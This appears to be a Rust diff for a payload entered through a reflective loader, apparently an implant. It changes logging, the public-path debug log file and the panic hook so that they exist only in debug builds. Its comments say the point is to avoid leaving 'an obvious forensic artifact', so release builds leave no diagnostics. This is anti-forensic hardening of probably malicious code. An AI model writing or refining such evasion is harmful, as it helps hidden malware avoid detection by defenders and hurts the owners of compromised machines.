@@ -65,17 +65,25 @@ mod winlog {
 
 macro_rules! log {
     ($path:expr, $($arg:tt)*) => {{
-        let msg = format!($($arg)*);
-        let full = format!("{}\n", msg);
-        // Try winlog first, fall back to eprintln
-        #[cfg(target_os = "windows")]
-        winlog::write_log($path, &full);
-        eprintln!("{}", msg);
-        let _ = std::io::Write::flush(&mut std::io::stderr());
+        // Debug builds only: writing a plaintext log file to a public path is
+        // an obvious forensic artifact, so release builds compile this away
+        // entirely (no file, no stderr).
+        if cfg!(debug_assertions) {
+            let msg = format!($($arg)*);
+            let full = format!("{}\n", msg);
+            // Try winlog first, fall back to eprintln
+            #[cfg(target_os = "windows")]
+            winlog::write_log($path, &full);
+            eprintln!("{}", msg);
+            let _ = std::io::Write::flush(&mut std::io::stderr());
+        }
     }};
 }
 
+#[cfg(debug_assertions)]
 const LOG_FILE: &str = "C:\\Users\\Public\\core_debug.txt";
+#[cfg(not(debug_assertions))]
+const LOG_FILE: &str = "";
 
 /// Entry point called by the reflective loader.
 /// NEVER RETURNS — the loader waits for the process to exit.
@@ -84,8 +92,8 @@ const LOG_FILE: &str = "C:\\Users\\Public\\core_debug.txt";
 /// `config_ptr` must point to valid UTF-8 JSON of length `config_len`.
 #[no_mangle]
 pub unsafe extern "system" fn core_main(config_ptr: *const u8, config_len: usize) {
-    // Immediate file log — doesn't depend on CRT
-    #[cfg(target_os = "windows")]
+    // Immediate file log — doesn't depend on CRT (debug builds only)
+    #[cfg(all(debug_assertions, target_os = "windows"))]
     winlog::write_log(LOG_FILE, "[core] core_main entered!\n");
 
     log!(LOG_FILE, "[core] core_main entered, ptr={:?}, len={}", config_ptr, config_len);
@@ -123,7 +131,9 @@ pub unsafe extern "system" fn core_main(config_ptr: *const u8, config_len: usize
     let args: Vec<String> = std::env::args().collect();
     log!(LOG_FILE, "[core] args={:?}", args);
 
-    // Install panic hook so we can see panic messages (panic=abort kills silently)
+    // Install panic hook so we can see panic messages (panic=abort kills silently).
+    // Debug builds only — release must not write diagnostics anywhere.
+    #[cfg(debug_assertions)]
     std::panic::set_hook(Box::new(|info| {
         let msg = format!("[core] PANIC: {}", info);
         eprintln!("{}", msg);
